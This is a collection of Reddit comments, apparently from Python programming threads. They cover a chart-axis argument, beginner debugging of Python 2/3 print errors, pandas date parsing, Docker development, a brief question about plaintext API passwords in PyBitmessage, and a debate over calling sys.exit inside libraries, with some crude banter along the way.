Yes, which is one dimension, which can move in one direction, which we can call, for simplicity, "above". Nothing wrong with that, its just about being understood.
Stop insulting nerds.
Sure, if OP had done that. But he did not. He chose to use UP on his chart to represent less time being spent, ignoring that UP also adds more time.
Yes. The amount of time doing a certain thing. 0000 - 0630 : Sleeping 0630 - 1200 : Working 1200 - 1300 : Sleeping 1300 - 1800 : Working 1800 - 2200 : Playing 2200 - 2359 : Sleeping From 0000 to 2359 (a measure of time) how much TIME was spent Awake? How much time was spent Working?
If he is spending more time, it should also move along the X axis. 
As a hobby/diversion: writing a PyQT5 application that opens an arbitrary Postgres database table, extracts the schema, generates a graphviz dot file from it, then generates and displays the resulting ERD.
Ok so that's one line going up, what does the X axis do?
All right, let's add some points to OP's graph; let's assume the points are (1,1), (2,1), (3,1), (4,2), (5,3), (6,4). How do you propose we express this information with one axis?
How will it take care of creating text files?
Yes, it will work.
Thanks, I'll check it out
download cygwin's "tar", then run tar fxz xxx.tar.gx
Slimey: Like slime. Timey: Like time. Some things behave timey despite not being time.
X is days passing. Y is hours in those days devoted to making useless charts.
Time - Time spent 1:00am - 1 minute 2:00am - 1 minute 3:00am - 1 minute 4:00am - 10 minutes 5:00am - 60 minutes 6:00am - 60 minutes ... Hope that makes sense...
Gives perspective. The graph of sleep increases at a rate of 1/1 for interval 0000 to 0630, then remains horizontal from 0630 to 1200. From 0000 to 1200, the max is 6.5. __/ _/ /
path.py Great API, self documented, a pleasure to use.
that you dont understand the graph doesn't make it wrong. I'm gonna try one more time and if you don't understand I will pass on you. Y axis could be any amount of time, but X axis is any specific point in time (timeline). Example: where the arrow is pointing could be: x: today at 3pm, y: 5 min. From then on he started to spend (or waste) more time making useless graphs Get it now? holy shit
For each data point on the line, the X represents the _position_ in the timeline, something like 2018/2/18, and the Y represents the total _duration_ of the time used in a given time period, something like doing something for 1 hours in total in a specific day. 
For each data point on the line, the X represents the _position_ in the timeline, something like 2018/2/18, and the Y represents the total _duration_ of the time used in a given time period, something like doing something for 1 hours in total in a specific day. 
21. IJustcopy. A lazy man's library for copying others peoples content and pasting it on reddit and passing it off as their content. This library is a must have.
open to relo?
You could use PyFilesystem https://www.pyfilesystem.org from fs.copy import copy_fs copy_fs('tar://example.tar.gz', './')
Probably not really necessary to re-scan the directory every loop.
Still learning Flask. I would really love for Miguel Grinberg to come up with a new edition.
Good bot
Thank you BlueSnakeYellowSnake for voting on Spam\_Detector\_Bot. This bot wants to find the best and worst bots on Reddit. [You can view results here](https://goodbot-badbot.herokuapp.com/). *** ^^Even ^^if ^^I ^^don't ^^reply ^^to ^^your ^^comment, ^^I'm ^^still ^^listening ^^for ^^votes. ^^Check ^^the ^^webpage ^^to ^^see ^^if ^^your ^^vote ^^registered!
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/commandline] [Keepmenu - a dmenu frontend for Keepass](https://www.reddit.com/r/commandline/comments/7xafcp/keepmenu_a_dmenu_frontend_for_keepass/) &amp;nbsp;*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))*
Letting your PC run for a week seems like the simplest solution, and also the most economical solution if your value your time at all.
from antigravity import geohash geohash(37.421542, -122.085589, b'2005-05-26-10458.68') (http://xkcd.com/426/)
Good bot 
What error do you get? It would be very helpful. Now, I ran the code, and line 18 is indented by only 3 spaces. This is the only error there is. Next time if you have a question about Python, be sure to post it in /r/learnpython !
r/dataisbeautiful would love this :)
42
Don't have a Python file with hardcoded strings. Put them into data files instead (e.g. a JSON file for each language). Don't use individual variables, use a dictionary instead to hold the strings. E.g., you could use a multi-level dictionary, in which the first key represents the language, and the second level the specific phrase. Say, you could then have a file `strings_en.json` with: { "greeting": "hello" } and a file `strings_es.json` with: { "greeting": "hola" } and then load them with: for lang in ['en', 'es']: with open(f'strings_{lang}.json') as f: strings[lang] = json.load(f) Then you can get the correct phrase, provided the language is specified by the variable `lang`, with `strings[lang]['greeting']`.
I asked for a number, not the answer to life, the universe and everything. *** ^^^I'm&amp;#32;a&amp;#32;Bot&amp;#32;*bleep*&amp;#32;*bloop*&amp;#32;|&amp;#32;[&amp;#32;**Block**&amp;#32;**me**](https://np.reddit.com/message/compose?to=friendly-bot&amp;subject=stop&amp;message=If%20you%20would%20like%20to%20stop%20seeing%20this%20bot%27s%20comments%2C%20send%20this%20private%20message%20with%20the%20subject%20%27stop%27.%20)&amp;#32;|&amp;#32;[**T҉he̛&amp;#32;L̨is̕t**](https://np.reddit.com/r/friendlybot/wiki/index)&amp;#32;|&amp;#32;[❤️](https://np.reddit.com/r/friendlybot/comments/7hrupo/suggestions)
"he's a cock" definitely sounds worse.
If anyone has stuff that is actually ready for other people to use and test, please post it in (r/TryMyThing)[https://www.reddit.com/r/TryMyThing/] and we'll give you some feedback/testing!
Sorry about posting in the wrong place. The space error is due to my formatting to post on here. The error message is hard to read... Traceback (most recent call last): File "&lt;frozen importlib._bootstrap&gt;", line 888, in _find_spec AttributeError: '_SixMetaPathImporter' object has no attribute 'find_spec' During handling of the above exception, another exception occurred: Traceback (most recent call last): File "tk_example.py", line 2, in &lt;module&gt; import requests File "/usr/lib/python3.6/site-packages/requests/__init__.py", line 43, in &lt;module&gt; import urllib3 File "/usr/lib/python3.6/site-packages/urllib3/__init__.py", line 8, in &lt;module&gt; from .connectionpool import ( File "/usr/lib/python3.6/site-packages/urllib3/connectionpool.py", line 11, in &lt;module&gt; from .exceptions import ( File "/usr/lib/python3.6/site-packages/urllib3/exceptions.py", line 2, in &lt;module&gt; from .packages.six.moves.http_client import ( File "&lt;frozen importlib._bootstrap&gt;", line 971, in _find_and_load File "&lt;frozen importlib._bootstrap&gt;", line 951, in _find_and_load_unlocked File "&lt;frozen importlib._bootstrap&gt;", line 890, in _find_spec File "&lt;frozen importlib._bootstrap&gt;", line 867, in _find_spec_legacy File "&lt;frozen importlib._bootstrap&gt;", line 449, in spec_from_loader File "/usr/lib/python3.6/site-packages/urllib3/packages/six.py", line 216, in is_package return hasattr(self.__get_module(fullname), "__path__") File "/usr/lib/python3.6/site-packages/urllib3/packages/six.py", line 118, in __getattr__ _module = self._resolve() File "/usr/lib/python3.6/site-packages/urllib3/packages/six.py", line 115, in _resolve return _import_module(self.mod) File "/usr/lib/python3.6/site-packages/urllib3/packages/six.py", line 82, in _import_module __import__(name) File "/usr/lib/python3.6/http/client.py", line 71, in &lt;module&gt; import email.parser File "/home/george/Documents/Python_files/email.py", line 17 print "Mail!" SyntaxError: Missing parentheses in call to 'print'. Did you mean print(int "Mail!")? I can't really make heads or tails of that unfortunately. 
Looks like the file "/home/george/Documents/Python_files/email.py" was written in Python 2. It still uses the 'print' statement rather than the 'print('foo')' function. Fix that file, then give it another shot.
Python 3.6 does not support print "Message" You need to write print("Message") So you're probably using a library on Python 2.6 that was written to an older version.
6
It's crazy to think about, but that comic is from 2007 (before Python 3). The future didn't even exist at that point. (Also it's crazy to think that this year is the 10 year anniversary of Python 3 ^and ^people ^still ^use ^Python ^2)
!isbot friendly-bot
I am 100.0% sure that friendly-bot is a bot. --- ^(I am a Neural Network being trained to detect spammers | Summon me with `!isbot &lt;username&gt;` |) [^Optout](https://www.reddit.com/message/compose?to=perrycohen&amp;subject=!optout&amp;message=!optout) ^| ^Feedback: ^/r/SpamBotDetection ^| [^GitHub](https://github.com/SM-Wistful/BotDetection-Algorithm)
Thank you! We are working on a version that will look better on mobile.
Coding up some modules for a series of 1-Wire Dallas/Maxim Temperature Sensor slave devices to be used in a new Atlanta microbrewery's process automation controller for interfacing with a beautiful little Xilinx PYNQ-Z1 board 
nice trolling, made me laugh
Why do you always make this about me!? We were discussing your shortcomings here. 
Don't try to understand, it will overload your walnut-sized brain *** ^^^I'm&amp;#32;a&amp;#32;Bot&amp;#32;*bleep*&amp;#32;*bloop*&amp;#32;|&amp;#32;[&amp;#32;**Block**&amp;#32;**me**](https://np.reddit.com/message/compose?to=friendly-bot&amp;subject=stop&amp;message=If%20you%20would%20like%20to%20stop%20seeing%20this%20bot%27s%20comments%2C%20send%20this%20private%20message%20with%20the%20subject%20%27stop%27.%20)&amp;#32;|&amp;#32;[**T҉he̛&amp;#32;L̨is̕t**](https://np.reddit.com/r/friendlybot/wiki/index)&amp;#32;|&amp;#32;[❤️](https://np.reddit.com/r/friendlybot/comments/7hrupo/suggestions)
There are 11 free books here: https://devfreebooks.github.io/python
That is quite typical. Since I am using Python 3.6, coerce() is no longer supported. Might I ask if you have other suggestions? :)
Here's a sneak peek of /r/data_irl using the [top posts](https://np.reddit.com/r/data_irl/top/?sort=top&amp;t=all) of all time! \#1: [data_irl](https://www.battleforthenet.com/?utm_source=AN&amp;utm_medium=email&amp;utm_campaign=BFTNCallTool&amp;utm_content=voteannouncement&amp;ref=fftf_fftfan1120_30&amp;link_id=0&amp;can_id=185bf77ffd26b044bcbf9d7fadbab34e&amp;email_referrer=email_265020&amp;email_subject=net-neutrality-dies-in-one-month-unless-we-stop-it) | [8 comments](https://np.reddit.com/r/data_irl/comments/7elaf9/data_irl/) \#2: [data_irl](http://i.imgur.com/hMVg9Uk.png) | [28 comments](https://np.reddit.com/r/data_irl/comments/62xcqc/data_irl/) \#3: [data_irl](https://i.redd.it/ja07b6n9vo6z.jpg) | [11 comments](https://np.reddit.com/r/data_irl/comments/6kcyqu/data_irl/) ---- ^^I'm ^^a ^^bot, ^^beep ^^boop ^^| ^^Downvote ^^to ^^remove ^^| [^^Contact ^^me](https://www.reddit.com/message/compose/?to=sneakpeekbot) ^^| [^^Info](https://np.reddit.com/r/sneakpeekbot/) ^^| [^^Opt-out](https://np.reddit.com/r/sneakpeekbot/comments/7o7jnj/blacklist/)
I've been writing a GPL-licensed [Internet blocker for Linux](https://github.com/aniketpanjwani/chomper) which I've named Chomper. It's effectively a porcelain around [mitmproxy](https://mitmproxy.org/). It goes beyond simple approaches using hosts files and instead routes traffic through a transparent proxy. For the last week or so, I've been stuck on a [really weird bug](https://github.com/aniketpanjwani/chomper/issues/1) where ipv6 websites sometimes will not connect while using Chomper. If anyone's got any suggestions, I'd love to hear them. If you're actually able to solve the bug, I've put [a bounty](https://www.bountysource.com/issues/54920646-ipv6-sites-do-not-function-from-some-networks) on it which you can collect. I'd even be happy to double the bounty for a redditor.
Definitely really cool how you were able to automate the word count but does anyone know how/if we can use python to use this using speech recognition? 
I just tested this on my notebook on python 3.6. pd.to_datetime('total', format='%Y%m%d', errors='coerce') NaT
Doesn't work
A cheap, reusable solution may be to just get a raspberry pi and run it on that continuously instead of your PC. Then you can repurpose it later or sell it.
Thank you, I do see it working. Thought you refered to the Python function coerce(). Say I wish to check each element in the column, it can be cast to a datetime object, sort of the following: for date in df['Date']: pd.to_datetime(df['Date'][i], format='%Y-%m-%d', errors='coerce') i = i + 1 Where I will only count the instances, where it can be cast as a datetime object. Then I do not utilize the "smart" ways of doing loops in Python, and do more like a loop in say Java, where I have to keep track of my loop integer i and the array indexing. Is there a more clever way to do it?
Yes. But the solution you want is not build in python. You can use https://www.cygwin.com/ but you need to compile mblist from source under cygwin. As long as mblist is written in c or c++ you can just use the gcc that cygwin brings.
Cool, that's a bar chart, since there is no relationship between the X and Y axis. Its essentially a set of one dimensional charts. [So something like this](https://www.tutorialspoint.com/r/images/barchart_months_revenue.png)
You DO realize in this example there is no relationship between the X and Y axis right? I've explained this 15 times now, either keep up or realize you are just not getting this. What you are (sort of) describing would be a bar chart.
Right so that's a bar chart then. Since there is no intrinsic relationship between 00 - 06 and 06 to 12. As far as their relationship to each other, it doesn't really matter. In other words its a bar chart.
No, you explain to me. What does 2 and 1 represent here?
I agree, it does sound like a simple task, but the encoding on the data files is something that I cannot figure out. When I attempt to read them in a windows env, I just get the raw hex values.
Right, except you can deduct money spent on food directly from money earned. Making one axis wholly redundant. If you wanted to show how much people in different income brackets spend on food, you would again, only need that axis, how much they spend on food. In other words a bar chart.
It is a streaming device, but what’s the downside of that? You can achieve the use-cases you described with it.
Everyone of those use cases sounds like "sweating the details". By which I mean the effort spent on them is better spent on something that matters.
The software you are trying to use is open source, so you can just read the source code to see how it decodes the data. 
Kinda funny, considering they're still using it 3 other times in the repo.
2 units of time from some starting point, and 1 unit of time spent making useless charts. The scalings of these units are arbitrary and need not be the same. If it helps you to think about it, assume the *x*-axis is in days and the *y*-axis is in hours.
...that could work.
Whats the run time? At 1 second, that is 196.9 million seconds. That's 6.24 years.
If you give me an example file and CSV output from that file, I'll take a poke at it tonight. 
if it's just a column: df1 = df[~df['df'].isnull()] df1.count()
Can't stream 4k. Has problems with streaming at times. Delay too much for online gaming. Those are the main reasons. I have a steambox, but am opting out of using it. Would much rather just run the hdmi Thanks for the reply
I can clearly see the relationship. At any given time (X axis) you can measure the time you spend doing something (Y axis). You better show us some proof that there are some rules to line graphs because to me and everyone else in here the graph makes perfect sense 
Can you run Docker on your system? There is a [Docker image for mbsystem](https://github.com/ofrei/mbsystem-docker). You may also be able to try installing it on the [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install-win10).
Coding can sometimes be frustrating. One possible idea is to write down program down on paper via psuedocode. You can then translate the program into python syntax after.
i copy the code directly from sites that teach python yet my code breaks.
There could be a number of reasons for this. - You don't have a library they are using installed - Syntax error in the tutorial - Bad code - Copy/paste error
propably the library, because i watched tutorials from 3 diffrent people and they didin't even mentioned them.
Step one would be to use `lxml` instead of `xml.etree` - it's way, _way_ faster.
Who uses virtualenvs anymore? docker is where its at! Why isolate your python packages when you can isolate EVERYTHING! have artifacts of everything you need, the real killer to the "but it works on my machine" problem.
I was looking through the `pytest` source today, it's very neat and easy to follow. 
This is terrible Python code. It may be a reference client but there's all sorts of shenanigans going on. Kind of disappointing.
As K900 said, use `lxml` and see if you can create the 200k FooBars in parallel.
I hacked together a [script](https://github.com/jmcph4/jcrl/blob/master/tools/test_scaffold.py) to generate some C code templates to help speed a few development tasks up.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [jmcph4/jcrl/.../**test_scaffold.py** (master → a29d708)](https://github.com/jmcph4/jcrl/blob/a29d708699bc4eb101586f8f833e1afbc67e2dc4/tools/test_scaffold.py) ---- 
Shame the power McAfee exerts on a coin 's single day price ;)
Working on a parser for Aixtron's scripting language using [Lark](https://github.com/erezsh/lark). It is a slow and painful process.
Very great, thank you! :)
Thanks!
Get a cheap VPS, Linode are like $10 a month. Can hardly beat that. 
Deeply buried `sys.exit` calls are definitely bad practice - it makes reading and debugging the code really difficult.
I'd agree with this. If it's literally in the entry point script of a CLI util, it's not too bad. If it's in a library module you're importing, it's probably wrong.
Does this single line really make code unreadable and undebuggable?
I developed a collection of [Free Python Games](http://www.grantjenks.com/docs/freegames/) which I like to use for programming clubs/education. Take a look and let me know what you think! There's no specific curriculum but it's a fun intro to programming.
It definitely does make things undebuggable when your program just stops randomly.
`sys.exit(1)` is a whole lot better. `sys.exit()` returns an error code of 0, which means your program completed successfully.
For some reason, /home/george/Documents/Python_files/ is in your Python path ahead of the standard system libraries Python is finding your file "email.py" instead of the email.py file in the system library. Here is where the problem is occurring: File "/usr/lib/python3.6/http/client.py", line 71, in &lt;module&gt; import email.parser Did you modify your system python path for some reason?
In a command line app, no. In pretty much anything else, yes.
I have just one sys.exit, which at the very bottom below my main function: if __name__ == '__main__': sys.exit(main(sys.argv)) That allows me to structure the main function just as you would see with a classic C program. It also allows me to call the main function from another module, and pass in parameters, without causing the entire program to exit at the end of the function call.
Try posting a more specific question in /r/learnpython.
No they wouldn't 
https://www.reddit.com/r/Python/comments/7wwwm5/5_speed_improvements_in_python_37/ posted yesterday.
How does UP represent less time being spent?? It represents the opposite
A bar chart is for discrete things. This chart plots continuous data
Sorry should've checked, will delete.
If you are going to be doing this to a lot of repos you might consider using BigQuery and the GitHub data set. * https://cloud.google.com/bigquery/public-data/github 
No worries; the URLs aren't exactly the same, so a search for this one wouldn't have turned up the other.
It's not really a python-specific issue, so it's not really an appropriate question here. What you are after is product developed that you feel is implied by the existence of this library, but what you are describing is really quite specific: Listen for specific inputs from multiple devices, if input is used, activate a different display. Note you would also need to run some kind of IR/data receiver or something to your living room to receive the signal, as it is unlikely to perform well passing through the floor wirelessly. It's something that does sound viable to code though, so why not do it? Kodi (XBMC) uses python as it's plugin language, so I'm sure you could run this kind of thing in that environment. If not, run it as a daemon on your system.
Just making sure you know that Python isn't C.
Because you're unable to elucidate your problem. "I am bad at piano." That's a stupid thing to say if I want to fix that, because it's so uselessly broad. If I want to improve, I'll have to narrow it down. "I am bad at learning a whole piece." Ok cool, now I can think of solutions, like maybe picking shorter pieces. What are your real problems?
fighting the good fight.
If you are using the same device and otherwise system config doesn’t change then you can just poll for a single device. Otherwise you will need to poll everything; polling the device or polling dmesg would be the way to go, dmesg can get messy and also but polling is going to be power and disk intensive which you don’t want on an Rpi You can also try using [udev](http://www.reactivated.net/writing_udev_rules.html) to trigger a script when it is plugged in. [Here](https://www.raspberrypi.org/forums/viewtopic.php?f=91&amp;t=43562) is someone doing it with rasbian. 
I haven't used PyOmo or PuLP, but I've used CVXPY for convex optimization. It has a high-level API which makes it nice for one-off problems but I found it pretty hard to integrate into larger applications. It should work well for linear programming since they are just special cases of conic programs which are convex. For general optimization, I find scipy's L-BFGS is often good enough though passing in everything in the right way has a bit of a learning curve.
Maybe it's not compatible with python 3?
Not at all a bad practice if you restrict its usage to inside a script, the kind that has ``#!/usr/bin/python``, a main loop and all that other jazz. If you hide it in a library function I will show up at your house with a baseball bat, and I won't be there to practice softball.
In general best to plan on code being reused. Have some functions where most work is happens that raise Exceptions when things go wrong and never call sys.exit. Then have like a main() function that calls those other functions and maybe depending on what they return, or what Exceptions they throw, call sys.exit if needed.
And makes reusing code really difficult too. An exception is better, with a catch near the entry point.
`git grep "pattern"`
He’s actually working on a new one! He has an ebook out and is releasing each chapter for free week by week. 
This is neat, but what's the use case?
If you are using GitHub exclusively, consider the [Search API](https://developer.github.com/v3/search/).
Where is your code?
Good examples are generally not hard to make: The best examples are counter examples. I start by agreeing with the student (apologies to /u/Exodus111, but this *is* what I do with students) and illustrating what they said. Then I have to justify bridging the gap between what they said and what I'm saying. Note that each response gets incrementally more complex, but only with respect to what the student (again, sorry) has offered. By thinking about discussion this way, I've gotten pretty quick at generating examples. The key is instantiating them, and doing so across mediums. It really forces the student to take the issue seriously. Consider how Jon Oliver was able to easily explain what Snowden himself couldn't: [By making surveillance about his penis](https://youtu.be/XEVlyP4_11M?t=26m58s). As for the details of the example, I didn't jump far. Time wasted on charts is not that different from time sleeping, but different enough to shake cognitive dissonance. I'd summarize this approach as "Yes, and/but/now don't forget about your genitals". No one ever starts a discussion with their genitals in mind\*, so any issue can be explained by instantiating something they take seriously and incrementally stepping towards the truth. Let's give it a shot: What's something you don't understand? \*You have already failed if they did start with their genitals in mind.
If you are doing a tutorial or a demonstration, you can use Disqus to answer questions. Also, you might get some helpful feedback from the comments.
I like the idea of mutants in a testing context. Hacks could similarly be used. It's a flavor of chaos testing I think.
This can't be right .. If I'm not mistaken, it would appear passwords are stored in plaintext. https://github.com/Bitmessage/PyBitmessage/blob/master/src/api.py#L134
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [Bitmessage/PyBitmessage/.../**api.py#L134** (master → 634a49c)](https://github.com/Bitmessage/PyBitmessage/blob/634a49cd6d8fc2f52504586be4c4766340641b25/src/api.py#L134) ---- 
Check out linode?
that is not how you start learning open an interactive python session and try typing something yourself
I have used pythonanywhere for this type of project in the past. 
Thanks folks. I put in a very simple averaging line that takes the last value and the new value and assigns that to the new value before setting the servos. It completely eliminated the visible oscillations. I have a problem with the vertical, but that, I'm sure, looking at the numbers generated, is some tiny, miserable little coding error I made, and I'm going to have to go through the whole program line-by-line to figure it out. My weekend.... Thanks again for all your input, I appreciate it. 
You'll probably get more help if you [format your code](https://www.reddit.com/r/learnpython/wiki/faq#wiki_how_do_i_format_code.3F) and post on a subreddit more receptive of questions, like /r/learnpython. When you see repetitive code like this, you should think of using a loop and a data structure to hold the bits that change. For instance: cb_data = ["Basil", "Garlic", ...] for (row, name) in enumerate(cb_data): Checkbutton(openWindow, text=name, onvalue=name, offvalue="", background='#B0CCFF').grid(row=row+2, column=2, sticky=W) Note that we *didn't* use the `variable`parameter. That's not simple to do and not really necessary, as when you want to use the Checkbutton values you can just query each Checkbutton state (in another loop) instead of querying the state variables. If you have extra fields you need to change in the loop, do this: cb_data = [("Basil", ...), ("Garlic", ...), ...] for (row, (name, &lt;whatever&gt;)) in enumerate(cb_data): Checkbutton(openWindow, ...) 
The [Windows Subsystem for Linux] (https://en.m.wikipedia.org/wiki/Windows_Subsystem_for_Linux) is exactly what you want. It's pretty seamless, and you end up with the ability to open a Ubuntu terminal as if it was any other desktop application. 
**Windows Subsystem for Linux** Windows Subsystem for Linux (WSL) is a compatibility layer for running Linux binary executables (in ELF format) natively on Windows 10. WSL provides a Linux-compatible kernel interface developed by Microsoft (containing no Linux kernel code), which can then run a Linux userland on top of it, such as that of Ubuntu, openSUSE or SUSE Linux Enterprise Server. Such a userland might contain a Bash shell and command language, with native Linux command-line tools (sed, awk, etc.) and programming language interpreters (Ruby, Python, etc.). When introduced with the Anniversary Update, only an Ubuntu image was available. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/Python/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
Working on a BDD step library, [behave-webdriver](https://github.com/spyoungtech/behave-webdriver), which revolves around behavior-driven selenium tests and automation tasks using Gherkin feature files. It is inspired and designed around its JavaScript counterpart, webdriverio/cucumber-boilerplate. Hoping for a release by the end of the month.
Rewriting the spaghetti code I wrote for some work tools over the past 3 months. It sucks.
Thanks for amazing feedback. That really helps!
How so? It looks like 'BMConfigParser' is a module to help them to prevent putting passwords and such into a repo in plaintext. Then the code and associated sensitive information files for 'BMConfigParser' can be put into an encrypted git repo and only have the DevOps team and a few engineers access to that repo.
I hate your IDE look, it's so hard to read, but it's a cool idea for a series!
Yeah, I wasn't sure so I was hoping someone would speak up. It does seem odd that it would do a straight `if password == Config.get('password')`(ps: pseudocode, follow link for actual code if someone else is reading), but I guess that doesn't necessarily mean it's "stored" in plaintext. Thanks for clarifying. 
i tried, the code, people give me is outdated, even on 2017 videos and it breaks in 'hello word'..
agreed
On another note, instead of doing this type of thing: count = 1 while count &lt; 20 ...stuff... count += 1 It is better/easier to do: for count in range(1,20): ...stuff... Also, since you do not use the variable 'count' anywhere, do this: for _ in range(1,20): ...stuff... On a final note, your original code will only run that loop 19 times, because you start at 1, go through 19, then when you loop with count at 20, it will stop before going into the while loop. If you want to run that loop 20 times, you have to make it like this: count = 1 while count &lt;= 20 ...stuff... count += 1 or: for _ in range(20): ...stuff... etc.
Make a loop: variables = {'Sweet Potato': sweetPotato, 'Jam': jam, ...} for row, (txt, variable) in enumerate(variables, 25): Checkbutton(openWindow, text=txt, variable=variable, onvalue=txt.replace(' ', ''), offvalue='', background='#B0CCFF').grid(row=row, column=2, sticky=W) Something like this
Docker on Windows uses a Hyper-V Linux VM to run itself.
open(), .read(), and os.remove() The only 3 functions you need. 
https://grafana.com/
For a project. I've never used python before but I figured out how to scrape it. I scraped some documents from EDGAR and should have scraped DEF 14A only but accidentally scraped DEF 14 so I have some DEF 14C's in there that I don't want.
Can you look at my comment above and see if I'm close?
While returning a code for success - 0. 
Oh, absolutely, very clear; thank you. In the last few projects I've worked on -in general- we would store things like API keys, etc.. in the system environment and they would be injected into the runtime. But passwords were always hashed (ie: finding "admin1234" in a text dump is never good, but something like "d83jfjc7fj"; who knows what it might be). This doesn't mean you couldn't have a startup password, it would only mean that it would have to be un-hashed first .. Something like (warning, pseudocode): if (hash(password, salt, env.TOKEN) == Config.get('hashed-password')): return success (Or the inverse) This is a primitive example, but I think it's enough to give an idea of what I mean. Interested to hear back. Cheers.
I think the main thing is scope and generalization. It could be quite easy to script this for your specific hardware and situation, but coding it in a way that can generally support a wide array of hardware is like... really a significant undertaking when you think about it. So, the barrier to you succeeding individually is much lower than the the barrier for a generic solution already existing. 
You don't need to look through the list of stuff in the directory at all. Just try to delete the file. If it doesn't exist the attempt will fail. Handle that. EAFP: It's easier to ask for forgiveness than permission. You have to handle the possibility that a file exists at the time of `os.listdir()` being called by already deleted/moved/renamed before `os.remove()` is called. So make that situation _normal_.
You need help shooting yourself in the leg? I’m impressed! :)
So pretend I'm dumb (it's not hard, I am). What can you do with mutants that you couldn't do with a generator? Cos you could do your example with a generator
It's important to return the proper error code so other applications know what to do including your OS, I would imagine. I believe I've read that in beginner c++ tutorials. 
That's actually funny because it's my case as well. 
That folder must be inside a directory that is in your PYTHONPATH environment variable, but the easiest way to do this is CD to the directory in which the mcpi folder is located before launching IDLE from that location. Also, this is the wrong subreddit, ask questions like this in [r/learnpython](https://www.reddit.com/r/learnpython/).
there is a chance you're hitting the incompatibility between python 2 and python 3 try print "hello world" then print("hello world") which one works?
It mocks the wrong thing. Python is not C but it still is an awesome tool for systems programming. And for systems programming checking exit codes is super important, that's why OC didn't say anything at all strange.
Bruh do you even Unix philosophy? If your code throws an error and doesn’t exit not zero I hope you stub your toe every day until you die
Try r/forhire ?
Yeah, it's something I am trying out, the editor look. If it gets more hate I might switch back, but you know, it's video, so it needs some visual flair in my opinion. It's why I keep referring to the code on github, you can just download it, and look at it in any environment you want, with any syntax theme you prefer.
I have a library I need to work with and it calls sys.exit if it fails to connect to find the device I want it to. I have never been more annoyed in my life than when I discovered that. Just throw an exception and let me handle it. 
Fuck yes it is. Nothing makes me want to rewrite your shit more than having to catch SystemExit
I'm not around the data ATM, but I will send those to you tomorrow. Thank you!
NOAA, and Windows 7, but may as well be XP.
Post the code and the error. Otherwise it’s really hard to help.
So, creating a scalable rule based engine to do media buying performance optimizations. 
&gt; Just throw an exception try: sys.exit() except SystemExit: print("It's still annoying though")
To succinctly echo what has been said by others: unless it's in your `if __name__ == '__main__':` block, probably yes.
&gt; In a library that someone else uses, if you call sys.exit, you won't be popular. &gt; &gt; Why? exit does not intercept exceptions. While sys.exit() does. 
Will check this out tomorrow
I doubt that. At least with the Air Force people I know, they use Windows 7. I had some horrific issues with their policies (and they'd find crazy broken ways to install my software that didn't work well, but they worked-ish and could be fixed), but I had a phone call with their IT guy who explained what they had to do. We had a lot fewer problems after that. Ultimately, my installers copy some files and make some shortcuts. The AF are big kids and can create shortcuts by themselves. Installers make it so they can't do that.
We're all adults here, right? Try: `exit()` No import.
Just so you know, Python programs throw error codes that aren't 0 when they fail and 0 when they succeed. You can overwrite that with sys.exit, so yes, it is a C thing. It's also a Python thing and a Fortran thing, and a Java thing, etc.
`functools.lru_cache` is great. Also `contextlib.contextmanager`.
Nah. findall: `sys.exit()` -&gt; `raise Exception("I wrote this dumb shit.")`
We're all adults here, right? `raise Exception("If you want to be fucking annoying at least use base exception not something that returns 0 to the system after literally crashing, fuck you.")`
because when you're a user of a third-party library you want to have the opportunity to handle an exception the way you wish
lol sorry `quit(-1)`
Seriously? Is that how you feel? I was trying to be constructive by giving insight as to why. 
 class RetardAlert(Exception): pass raise RetardAlert("It's time to stop.")
Well if you use exit or sys.exit in a library that's on you. If you have __main__ in your in code, sys.exit is useful when a module raises a exception. After exit I can use $_ to check the exit code, which return and exit won't do. 
No idea, it works fine I jupyter for me
This is a good point. I would be rightfully confused to see error code zero in a failed script.
From my point of view if I'm using your lib to connect to an API for example, if your lib exits rather than throws an exception on a connection failure I can't write retry code.
Every time I read this, I have a question about that. Do you keep recreating Docker container on change? If not, how do you develop in a Docker container?
If it's not in main function then it's unacceptable and I will trash your file the moment I see anything related to this, since it wasn't obvious enough to you.
&gt; Do you keep recreating Docker container on change? If not, how do you develop in a Docker container? You simply mount a directory from your host OS to the container. So if the source code in your container is in `/src/myapp/`, then when running the container you tell Docker to mount a directory from your host OS to that location, using something like: `-v /usr/tickettoride98/myapp/:/src/myapp/`, and then any changes you make to the the files on your host OS are seen in the container. Then when you're ready to 'bake' the Docker image you simply rebuild the image and it copies the source code to `/src/myapp` and you run it without mounting any directories, so it uses the source code baked into the image itself. Make sense?
is that what "`RetardAlert`" meant?
Not a decorator.
Thank you, I did review them yesterday but they aren't as critical as the one used in the exploit. The ones in `bitmessagecli.py` are run interactively, and when you can run the script, you can usually run any other code too (so you're already screwed). The ones in `inventory.py` requires that the attacker modifies the configuration, which again means that he already has write access to the filesystem. They'll still be changed but wasn't as high a priority as the remote exploit yesterday.
Hmm... **property** **classmethod** **staticmethod** **functools.total_ordering** **functools.lru_cache** **functools.single_dispatch** **functools.wraps** **contextlb.contextmanager** To name a few.
Sorry about that. I looked up the python one first, and then I realized I should've looked for a beginner one. I'll remove the old post.
Yeah, I'm more commenting on the irony of recognizing a terrifically bad idea while continuing to employ it. But, hey, we keep trying that democracy thing, and look how well it worked for it's inventors.
#what i have so far import random baby = ["ba","bi","bu","ga","gi","gu"] for b in range(0,101): print (random.choice(baby)) #this prints out 100 lines of random items from the list but only in 1 syllable increments 
Except one requires an import.
This is superb!
I'm not a Python programmer. Can you explain why this works?
* property * classmethod * staticmethod * functools.total_ordering * functools.lru_cache * functools.single_dispatch * functools.wraps * contextlb.contextmanager
what @tickttoride98 said.
